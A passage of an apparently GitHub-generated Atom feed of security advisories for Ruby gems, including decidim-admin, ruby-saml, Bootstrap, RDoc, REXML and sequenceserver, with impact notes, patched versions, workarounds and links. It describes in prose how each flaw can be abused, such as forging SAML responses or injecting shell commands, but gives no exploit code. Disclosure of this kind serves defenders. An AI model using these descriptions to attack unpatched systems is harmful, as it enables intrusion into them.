<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-32034">https://nvd.nist.gov/vuln/detail/CVE-2024-32034</a></li>
<li><a href="https://github.com/decidim/decidim/commit/23fc8d702a4976727f78617f5e42353d67931645">https://github.com/decidim/decidim/commit/23fc8d702a4976727f78617f5e42353d67931645</a></li>
<li><a href="https://github.com/decidim/decidim/commit/9d79f09a2d38c87feb28725670d6cc1f55c22072">https://github.com/decidim/decidim/commit/9d79f09a2d38c87feb28725670d6cc1f55c22072</a></li>
<li><a href="https://github.com/decidim/decidim/commit/e494235d559be13dd1f8694345e6f6bba762d1c0">https://github.com/decidim/decidim/commit/e494235d559be13dd1f8694345e6f6bba762d1c0</a></li>
<li><a href="https://github.com/decidim/decidim/commit/ff755e23814aeb56e9089fc08006a5d3faee47b6">https://github.com/decidim/decidim/commit/ff755e23814aeb56e9089fc08006a5d3faee47b6</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/decidim-admin/CVE-2024-32034.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/decidim-admin/CVE-2024-32034.yml</a></li>
<li><a href="https://github.com/advisories/GHSA-rx9f-5ggv-5rh6">https://github.com/advisories/GHSA-rx9f-5ggv-5rh6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rx9f-5ggv-5rh6</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-09-16T17:17:20.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[decidim-admin] Decidim::Admin vulnerable to cross-site scripting (XSS) in the admin activity log]]></title>
        <id>https://github.com/advisories/GHSA-rx9f-5ggv-5rh6</id>
        <link href="https://github.com/advisories/GHSA-rx9f-5ggv-5rh6"/>
        <updated>2024-09-17T22:27:21.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The admin panel is subject to potential XSS attach in case an admin assigns a valuator to a proposal, or does any other action that generates an admin activity log where one of the resources has an XSS crafted. </p>
<h3 id="patches">Patches</h3>
<p>N/A</p>
<h3 id="workarounds">Workarounds</h3>
<p>Redirect the pages /admin and /admin/logs to other admin pages to prevent this access (i.e. <code>/admin/organization/edit</code>)</p>
<h3 id="references">References</h3>
<p>OWASP ASVS v4.0.3-5.1.3</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/decidim/decidim/security/advisories/GHSA-rx9f-5ggv-5rh6">https://github.com/decidim/decidim/security/advisories/GHSA-rx9f-5ggv-5rh6</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-32034">https://nvd.nist.gov/vuln/detail/CVE-2024-32034</a></li>
<li><a href="https://github.com/decidim/decidim/commit/23fc8d702a4976727f78617f5e42353d67931645">https://github.com/decidim/decidim/commit/23fc8d702a4976727f78617f5e42353d67931645</a></li>
<li><a href="https://github.com/decidim/decidim/commit/9d79f09a2d38c87feb28725670d6cc1f55c22072">https://github.com/decidim/decidim/commit/9d79f09a2d38c87feb28725670d6cc1f55c22072</a></li>
<li><a href="https://github.com/decidim/decidim/commit/e494235d559be13dd1f8694345e6f6bba762d1c0">https://github.com/decidim/decidim/commit/e494235d559be13dd1f8694345e6f6bba762d1c0</a></li>
<li><a href="https://github.com/decidim/decidim/commit/ff755e23814aeb56e9089fc08006a5d3faee47b6">https://github.com/decidim/decidim/commit/ff755e23814aeb56e9089fc08006a5d3faee47b6</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/decidim-admin/CVE-2024-32034.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/decidim-admin/CVE-2024-32034.yml</a></li>
<li><a href="https://github.com/advisories/GHSA-rx9f-5ggv-5rh6">https://github.com/advisories/GHSA-rx9f-5ggv-5rh6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rx9f-5ggv-5rh6</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-09-16T17:17:20.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[omniauth-saml] omniauth-saml vulnerable to Improper Verification of Cryptographic Signature]]></title>
        <id>https://github.com/advisories/GHSA-cvp8-5r8g-fhvq</id>
        <link href="https://github.com/advisories/GHSA-cvp8-5r8g-fhvq"/>
        <updated>2024-09-16T15:29:13.000Z</updated>
        <content type="html"><![CDATA[<p>ruby-saml, the dependent SAML gem of omniauth-saml has a signature wrapping vulnerability in &lt;= v1.12.0 and v1.13.0 to v1.16.0 , see <a href="https://github.com/SAML-Toolkits/ruby-saml/security/advisories/GHSA-jw9c-mfg7-9rx2">https://github.com/SAML-Toolkits/ruby-saml/security/advisories/GHSA-jw9c-mfg7-9rx2</a> 
As a result, omniauth-saml created a <a href="https://github.com/omniauth/omniauth-saml/releases">new release</a> by upgrading ruby-saml to the patched versions v1.17. </p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/SAML-Toolkits/ruby-saml/security/advisories/GHSA-jw9c-mfg7-9rx2">https://github.com/SAML-Toolkits/ruby-saml/security/advisories/GHSA-jw9c-mfg7-9rx2</a></li>
<li><a href="https://github.com/omniauth/omniauth-saml/security/advisories/GHSA-cvp8-5r8g-fhvq">https://github.com/omniauth/omniauth-saml/security/advisories/GHSA-cvp8-5r8g-fhvq</a></li>
<li><a href="https://github.com/omniauth/omniauth-saml/commit/4274e9d57e65f2dcaae4aa3b2accf831494f2ddd">https://github.com/omniauth/omniauth-saml/commit/4274e9d57e65f2dcaae4aa3b2accf831494f2ddd</a></li>
<li><a href="https://github.com/omniauth/omniauth-saml/commit/6c681fd082ab3daf271821897a40ab3417382e29">https://github.com/omniauth/omniauth-saml/commit/6c681fd082ab3daf271821897a40ab3417382e29</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/omniauth-saml/GHSA-cvp8-5r8g-fhvq.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/omniauth-saml/GHSA-cvp8-5r8g-fhvq.yml</a></li>
<li><a href="https://github.com/advisories/GHSA-cvp8-5r8g-fhvq">https://github.com/advisories/GHSA-cvp8-5r8g-fhvq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-cvp8-5r8g-fhvq</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2024-09-11T21:08:26.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[ruby-saml] SAML authentication bypass via Incorrect XPath selector]]></title>
        <id>https://github.com/advisories/GHSA-jw9c-mfg7-9rx2</id>
        <link href="https://github.com/advisories/GHSA-jw9c-mfg7-9rx2"/>
        <updated>2024-09-16T15:29:27.000Z</updated>
        <content type="html"><![CDATA[<p>Ruby-SAML in &lt;= 12.2 and 1.13.0 &lt;= 1.16.0 does not properly verify the signature of the SAML Response. An unauthenticated attacker with access to any signed saml document (by the IdP) can thus forge a SAML Response/Assertion with arbitrary contents. This would allow the attacker to log in as arbitrary user within the vulnerable system.</p>
<p>This vulnerability was reported by ahacker1 of SecureSAML (<a href="mailto:ahacker1@securesaml.com">ahacker1@securesaml.com</a>)</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/SAML-Toolkits/ruby-saml/security/advisories/GHSA-jw9c-mfg7-9rx2">https://github.com/SAML-Toolkits/ruby-saml/security/advisories/GHSA-jw9c-mfg7-9rx2</a></li>
<li><a href="https://github.com/SAML-Toolkits/ruby-saml/commit/1ec5392bc506fe43a02dbb66b68741051c5ffeae">https://github.com/SAML-Toolkits/ruby-saml/commit/1ec5392bc506fe43a02dbb66b68741051c5ffeae</a></li>
<li><a href="https://github.com/SAML-Toolkits/ruby-saml/commit/4865d030cae9705ee5cdb12415c654c634093ae7">https://github.com/SAML-Toolkits/ruby-saml/commit/4865d030cae9705ee5cdb12415c654c634093ae7</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-45409">https://nvd.nist.gov/vuln/detail/CVE-2024-45409</a></li>
<li><a href="https://github.com/omniauth/omniauth-saml/security/advisories/GHSA-cvp8-5r8g-fhvq">https://github.com/omniauth/omniauth-saml/security/advisories/GHSA-cvp8-5r8g-fhvq</a></li>
<li><a href="https://github.com/omniauth/omniauth-saml/commit/4274e9d57e65f2dcaae4aa3b2accf831494f2ddd">https://github.com/omniauth/omniauth-saml/commit/4274e9d57e65f2dcaae4aa3b2accf831494f2ddd</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/omniauth-saml/CVE-2024-45409.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/omniauth-saml/CVE-2024-45409.yml</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/ruby-saml/CVE-2024-45409.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/ruby-saml/CVE-2024-45409.yml</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/omniauth-saml/GHSA-cvp8-5r8g-fhvq.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/omniauth-saml/GHSA-cvp8-5r8g-fhvq.yml</a></li>
<li><a href="https://github.com/advisories/GHSA-jw9c-mfg7-9rx2">https://github.com/advisories/GHSA-jw9c-mfg7-9rx2</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jw9c-mfg7-9rx2</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2024-09-10T19:42:03.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[ruby-saml] SAML authentication bypass via Incorrect XPath selector]]></title>
        <id>https://github.com/advisories/GHSA-jw9c-mfg7-9rx2</id>
        <link href="https://github.com/advisories/GHSA-jw9c-mfg7-9rx2"/>
        <updated>2024-09-16T15:29:27.000Z</updated>
        <content type="html"><![CDATA[<p>Ruby-SAML in &lt;= 12.2 and 1.13.0 &lt;= 1.16.0 does not properly verify the signature of the SAML Response. An unauthenticated attacker with access to any signed saml document (by the IdP) can thus forge a SAML Response/Assertion with arbitrary contents. This would allow the attacker to log in as arbitrary user within the vulnerable system.</p>
<p>This vulnerability was reported by ahacker1 of SecureSAML (<a href="mailto:ahacker1@securesaml.com">ahacker1@securesaml.com</a>)</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/SAML-Toolkits/ruby-saml/security/advisories/GHSA-jw9c-mfg7-9rx2">https://github.com/SAML-Toolkits/ruby-saml/security/advisories/GHSA-jw9c-mfg7-9rx2</a></li>
<li><a href="https://github.com/SAML-Toolkits/ruby-saml/commit/1ec5392bc506fe43a02dbb66b68741051c5ffeae">https://github.com/SAML-Toolkits/ruby-saml/commit/1ec5392bc506fe43a02dbb66b68741051c5ffeae</a></li>
<li><a href="https://github.com/SAML-Toolkits/ruby-saml/commit/4865d030cae9705ee5cdb12415c654c634093ae7">https://github.com/SAML-Toolkits/ruby-saml/commit/4865d030cae9705ee5cdb12415c654c634093ae7</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-45409">https://nvd.nist.gov/vuln/detail/CVE-2024-45409</a></li>
<li><a href="https://github.com/omniauth/omniauth-saml/security/advisories/GHSA-cvp8-5r8g-fhvq">https://github.com/omniauth/omniauth-saml/security/advisories/GHSA-cvp8-5r8g-fhvq</a></li>
<li><a href="https://github.com/omniauth/omniauth-saml/commit/4274e9d57e65f2dcaae4aa3b2accf831494f2ddd">https://github.com/omniauth/omniauth-saml/commit/4274e9d57e65f2dcaae4aa3b2accf831494f2ddd</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/omniauth-saml/CVE-2024-45409.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/omniauth-saml/CVE-2024-45409.yml</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/ruby-saml/CVE-2024-45409.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/ruby-saml/CVE-2024-45409.yml</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/omniauth-saml/GHSA-cvp8-5r8g-fhvq.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/omniauth-saml/GHSA-cvp8-5r8g-fhvq.yml</a></li>
<li><a href="https://github.com/advisories/GHSA-jw9c-mfg7-9rx2">https://github.com/advisories/GHSA-jw9c-mfg7-9rx2</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jw9c-mfg7-9rx2</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2024-09-10T19:42:03.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[bootstrap] Bootstrap Cross-Site Scripting (XSS) vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-vc8w-jr9v-vj7f</id>
        <link href="https://github.com/advisories/GHSA-vc8w-jr9v-vj7f"/>
        <updated>2024-09-06T19:07:45.000Z</updated>
        <content type="html"><![CDATA[<p>A vulnerability has been identified in Bootstrap that exposes users to Cross-Site Scripting (XSS) attacks. The issue is present in the carousel component, where the data-slide and data-slide-to attributes can be exploited through the href attribute of an <a> tag due to inadequate sanitization. This vulnerability could potentially enable attackers to execute arbitrary JavaScript within the victim's browser.</a></p><a>
<h3 id="references">References</h3>
</a><ul><a>
</a><li><a></a><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-6531">https://nvd.nist.gov/vuln/detail/CVE-2024-6531</a></li>
<li><a href="https://www.herodevs.com/vulnerability-directory/cve-2024-6531">https://www.herodevs.com/vulnerability-directory/cve-2024-6531</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/bootstrap/CVE-2024-6531.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/bootstrap/CVE-2024-6531.yml</a></li>
<li><a href="https://github.com/advisories/GHSA-vc8w-jr9v-vj7f">https://github.com/advisories/GHSA-vc8w-jr9v-vj7f</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vc8w-jr9v-vj7f</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-07-11T18:31:14.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[request_store] request_store has Incorrect Default Permissions]]></title>
        <id>https://github.com/advisories/GHSA-frp2-5qfc-7r8m</id>
        <link href="https://github.com/advisories/GHSA-frp2-5qfc-7r8m"/>
        <updated>2024-08-26T14:12:40.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The files published as part of request_store 1.3.2 have 0666 permissions, meaning that they are world-writable, which allows local users to execute arbitrary code.</p>
<p>This version was published in 2017, and most production environments do not allow access for local users, so the chances of this being exploited are very low, given that the vast majority of users will have upgraded, and those that have not, if any, are not likely to be exposed.</p>
<h3 id="patches">Patches</h3>
<p>I am not aware of any other version of the gem with incorrect permissions, so simply upgrading should fix the issue.</p>
<h3 id="workarounds">Workarounds</h3>
<p>You could chmod the files yourself, I guess.</p>
<h3 id="references">References</h3>
<p><a href="https://cwe.mitre.org/data/definitions/276.html">https://cwe.mitre.org/data/definitions/276.html</a></p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/steveklabnik/request_store/security/advisories/GHSA-frp2-5qfc-7r8m">https://github.com/steveklabnik/request_store/security/advisories/GHSA-frp2-5qfc-7r8m</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-43791">https://nvd.nist.gov/vuln/detail/CVE-2024-43791</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/request_store/CVE-2024-43791.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/request_store/CVE-2024-43791.yml</a></li>
<li><a href="https://github.com/advisories/GHSA-frp2-5qfc-7r8m">https://github.com/advisories/GHSA-frp2-5qfc-7r8m</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-frp2-5qfc-7r8m</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-08-23T18:54:26.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[rexml] REXML denial of service vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-vmwr-mc7x-5vc3</id>
        <link href="https://github.com/advisories/GHSA-vmwr-mc7x-5vc3"/>
        <updated>2024-08-28T20:08:16.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The REXML gem before 3.3.6 has a DoS vulnerability when it parses an XML that has many deep elements that have same local name attributes.</p>
<p>If you need to parse untrusted XMLs with tree parser API like <code>REXML::Document.new</code>, you may be impacted to this vulnerability. If you use other parser APIs such as stream parser API and SAX2 parser API, this vulnerability is not affected.</p>
<h3 id="patches">Patches</h3>
<p>The REXML gem 3.3.6 or later include the patch to fix the vulnerability.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Don't parse untrusted XMLs with tree parser API.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://www.ruby-lang.org/en/news/2024/08/22/dos-rexml-cve-2024-43398/">https://www.ruby-lang.org/en/news/2024/08/22/dos-rexml-cve-2024-43398/</a> : An announce on <a href="http://www.ruby-lang.org">www.ruby-lang.org</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/ruby/rexml/security/advisories/GHSA-vmwr-mc7x-5vc3">https://github.com/ruby/rexml/security/advisories/GHSA-vmwr-mc7x-5vc3</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-43398">https://nvd.nist.gov/vuln/detail/CVE-2024-43398</a></li>
<li><a href="https://github.com/ruby/rexml/commit/7cb5eaeb221c322b9912f724183294d8ce96bae3">https://github.com/ruby/rexml/commit/7cb5eaeb221c322b9912f724183294d8ce96bae3</a></li>
<li><a href="https://github.com/ruby/rexml/releases/tag/v3.3.6">https://github.com/ruby/rexml/releases/tag/v3.3.6</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/rexml/CVE-2024-43398.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/rexml/CVE-2024-43398.yml</a></li>
<li><a href="https://www.ruby-lang.org/en/news/2024/08/22/dos-rexml-cve-2024-43398">https://www.ruby-lang.org/en/news/2024/08/22/dos-rexml-cve-2024-43398</a></li>
<li><a href="https://github.com/advisories/GHSA-vmwr-mc7x-5vc3">https://github.com/advisories/GHSA-vmwr-mc7x-5vc3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vmwr-mc7x-5vc3</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-08-22T16:40:46.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[bindata] Potential Denial-of-Service in bindata]]></title>
        <id>https://github.com/advisories/GHSA-hj56-84jw-67h6</id>
        <link href="https://github.com/advisories/GHSA-hj56-84jw-67h6"/>
        <updated>2024-08-21T16:34:07.000Z</updated>
        <content type="html"><![CDATA[<p>In the bindata RubyGem before version 2.4.10 there is a potential denial-of-service vulnerability. In affected versions it is very slow for certain classes in BinData to be created. For example <code>BinData::Bit100000</code>, <code>BinData::Bit100001</code>, <code>BinData::Bit100002</code>, <code>BinData::Bit&lt;N&gt;</code>. In combination with <code>&lt;user_input&gt;.constantize</code> there is a potential for a CPU-based DoS. In version 2.4.10, bindata improved the creation time of Bits and Integers.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/rubysec/ruby-advisory-db/issues/476">https://github.com/rubysec/ruby-advisory-db/issues/476</a></li>
<li><a href="https://github.com/dmendel/bindata/commit/d99f050b88337559be2cb35906c1f8da49531323">https://github.com/dmendel/bindata/commit/d99f050b88337559be2cb35906c1f8da49531323</a></li>
<li><a href="https://about.gitlab.com/releases/2021/06/01/security-release-gitlab-13-12-2-released/#update-bindata-dependency">https://about.gitlab.com/releases/2021/06/01/security-release-gitlab-13-12-2-released/#update-bindata-dependency</a></li>
<li><a href="https://github.com/dmendel/bindata/blob/master/ChangeLog.rdoc#version-2410-2021-05-18-">https://github.com/dmendel/bindata/blob/master/ChangeLog.rdoc#version-2410-2021-05-18-</a></li>
<li><a href="https://rubygems.org/gems/bindata">https://rubygems.org/gems/bindata</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-32823">https://nvd.nist.gov/vuln/detail/CVE-2021-32823</a></li>
<li><a href="https://github.com/dmendel/bindata/blob/v2.4.10/ChangeLog.rdoc#version-2410-2021-05-18-">https://github.com/dmendel/bindata/blob/v2.4.10/ChangeLog.rdoc#version-2410-2021-05-18-</a></li>
<li><a href="https://github.com/advisories/GHSA-hj56-84jw-67h6">https://github.com/advisories/GHSA-hj56-84jw-67h6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hj56-84jw-67h6</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2021-06-23T23:42:04.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[rdoc] RDoc RCE vulnerability with .rdoc_options]]></title>
        <id>https://github.com/advisories/GHSA-592j-995h-p23j</id>
        <link href="https://github.com/advisories/GHSA-592j-995h-p23j"/>
        <updated>2024-08-21T16:27:25.000Z</updated>
        <content type="html"><![CDATA[<p>An issue was discovered in RDoc 6.3.3 through 6.6.2, as distributed in Ruby 3.x through 3.3.0.</p>
<p>When parsing <code>.rdoc_options</code> (used for configuration in RDoc) as a YAML file, object injection and resultant remote code execution are possible because there are no restrictions on the classes that can be restored.</p>
<p>When loading the documentation cache, object injection and resultant remote code execution are also possible if there were a crafted cache.</p>
<p>We recommend to update the RDoc gem to version 6.6.3.1 or later. In order to ensure compatibility with bundled version in older Ruby series, you may update as follows instead:</p>
<ul>
<li>For Ruby 3.0 users: Update to <code>rdoc</code> 6.3.4.1</li>
<li>For Ruby 3.1 users: Update to <code>rdoc</code> 6.4.1.1</li>
<li>For Ruby 3.2 users: Update to <code>rdoc</code> 6.5.1.1</li>
</ul>
<p>You can use <code>gem update rdoc</code> to update it. If you are using bundler, please add <code>gem "rdoc", "&gt;= 6.6.3.1"</code> to your <code>Gemfile</code>.</p>
<p>Note: 6.3.4, 6.4.1, 6.5.1 and 6.6.3 have a incorrect fix. We recommend to upgrade 6.3.4.1, 6.4.1.1, 6.5.1.1 and 6.6.3.1 instead of them.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/ruby/rdoc/commit/1254b0066f312ddbf7fae7a195e66ce5b3bc6656">https://github.com/ruby/rdoc/commit/1254b0066f312ddbf7fae7a195e66ce5b3bc6656</a></li>
<li><a href="https://github.com/ruby/rdoc/commit/32ff6ba0bebd8ea26f569da5fd23be2937f6a644">https://github.com/ruby/rdoc/commit/32ff6ba0bebd8ea26f569da5fd23be2937f6a644</a></li>
<li><a href="https://github.com/ruby/rdoc/commit/48617985e9fbc2825219d55f04e3e0e98d2923be">https://github.com/ruby/rdoc/commit/48617985e9fbc2825219d55f04e3e0e98d2923be</a></li>
<li><a href="https://github.com/ruby/rdoc/commit/811f125a4a0cc968e3eb18e16ea6c1a3b49a11bf">https://github.com/ruby/rdoc/commit/811f125a4a0cc968e3eb18e16ea6c1a3b49a11bf</a></li>
<li><a href="https://github.com/ruby/rdoc/commit/a5de13bf0f0c26f8e764e82b5bf4bf8bffc7198e">https://github.com/ruby/rdoc/commit/a5de13bf0f0c26f8e764e82b5bf4bf8bffc7198e</a></li>
<li><a href="https://github.com/ruby/rdoc/commit/d22ba930f1f611dda531dba04cd3d2531bb3f8a5">https://github.com/ruby/rdoc/commit/d22ba930f1f611dda531dba04cd3d2531bb3f8a5</a></li>
<li><a href="https://github.com/ruby/rdoc/commit/da7a0c7553ef7250ca665a3fecdc01dbaacbb43d">https://github.com/ruby/rdoc/commit/da7a0c7553ef7250ca665a3fecdc01dbaacbb43d</a></li>
<li><a href="https://github.com/ruby/rdoc/commit/e4a0e71e6f1032f8b4e5e58b4ef60d702c22ce17">https://github.com/ruby/rdoc/commit/e4a0e71e6f1032f8b4e5e58b4ef60d702c22ce17</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/rdoc/CVE-2024-27281.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/rdoc/CVE-2024-27281.yml</a></li>
<li><a href="https://www.ruby-lang.org/en/news/2024/03/21/rce-rdoc-cve-2024-27281">https://www.ruby-lang.org/en/news/2024/03/21/rce-rdoc-cve-2024-27281</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-27281">https://nvd.nist.gov/vuln/detail/CVE-2024-27281</a></li>
<li><a href="https://hackerone.com/reports/1187477">https://hackerone.com/reports/1187477</a></li>
<li><a href="https://github.com/advisories/GHSA-592j-995h-p23j">https://github.com/advisories/GHSA-592j-995h-p23j</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-592j-995h-p23j</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-03-25T19:36:59.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[fugit] fugit parse and parse_nat stall on lengthy input]]></title>
        <id>https://github.com/advisories/GHSA-2m96-52r3-2f3g</id>
        <link href="https://github.com/advisories/GHSA-2m96-52r3-2f3g"/>
        <updated>2024-08-21T14:55:23.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The fugit "natural" parser, that turns "every wednesday at 5pm" into "0 17 * * 3", accepted any length of input and went on attempting to parse it, not returning promptly, as expected. The parse call could hold the thread with no end in sight.</p>
<p>Fugit dependents that do not check (user) input length for plausability are impacted.</p>
<h3 id="patches">Patches</h3>
<p>Problem was reported in #104 and the fix was released in <a href="https://rubygems.org/gems/fugit/versions/1.11.1">fugit 1.11.1</a></p>
<h3 id="workarounds">Workarounds</h3>
<p>By making sure that <code>Fugit.parse(s)</code>, <code>Fugit.do_parse(s)</code>, <code>Fugit.parse_nat(s)</code>, <code>Fugit.do_parse_nat(s)</code>, <code>Fugit::Nat.parse(s)</code>, and <code>Fugit::Nat.do_parse(s)</code> are not fed strings too long. 1000 chars feels ok, while 10_000 chars makes it stall.</p>
<p>In fewer words, making sure those fugit methods are not fed unvetted input strings.</p>
<h3 id="references">References</h3>
<p>gh-104</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/floraison/fugit/security/advisories/GHSA-2m96-52r3-2f3g">https://github.com/floraison/fugit/security/advisories/GHSA-2m96-52r3-2f3g</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-43380">https://nvd.nist.gov/vuln/detail/CVE-2024-43380</a></li>
<li><a href="https://github.com/floraison/fugit/issues/104">https://github.com/floraison/fugit/issues/104</a></li>
<li><a href="https://github.com/floraison/fugit/commit/ad2c1c9c737213d585fff0b51c927d178b2c05a5">https://github.com/floraison/fugit/commit/ad2c1c9c737213d585fff0b51c927d178b2c05a5</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/fugit/CVE-2024-43380.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/fugit/CVE-2024-43380.yml</a></li>
<li><a href="https://github.com/advisories/GHSA-2m96-52r3-2f3g">https://github.com/advisories/GHSA-2m96-52r3-2f3g</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2m96-52r3-2f3g</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-08-19T17:29:36.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[sequenceserver] Command Injection in sequenceserver]]></title>
        <id>https://github.com/advisories/GHSA-qv32-5wm2-p32h</id>
        <link href="https://github.com/advisories/GHSA-qv32-5wm2-p32h"/>
        <updated>2024-08-14T22:16:28.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Several HTTP endpoints did not properly sanitize user input and/or query parameters. This could be exploited to inject and run unwanted shell commands</p>
<h3 id="patches">Patches</h3>
<p>Fixed in 3.1.2</p>
<h3 id="workarounds">Workarounds</h3>
<p>No known workarounds</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/wurmlab/sequenceserver/security/advisories/GHSA-qv32-5wm2-p32h">https://github.com/wurmlab/sequenceserver/security/advisories/GHSA-qv32-5wm2-p32h</a></li>
<li><a href="https://github.com/wurmlab/sequenceserver/commit/457e52709f7f9ed2fceed59b3db564cb50785dba">https://github.com/wurmlab/sequenceserver/commit/457e52709f7f9ed2fceed59b3db564cb50785dba</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-42360">https://nvd.nist.gov/vuln/detail/CVE-2024-42360</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/sequenceserver/CVE-2024-42360.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/sequenceserver/CVE-2024-42360.yml</a></li>
<li><a href="https://github.com/advisories/GHSA-qv32-5wm2-p32h">https://github.com/advisories/GHSA-qv32-5wm2-p32h</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qv32-5wm2-p32h</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
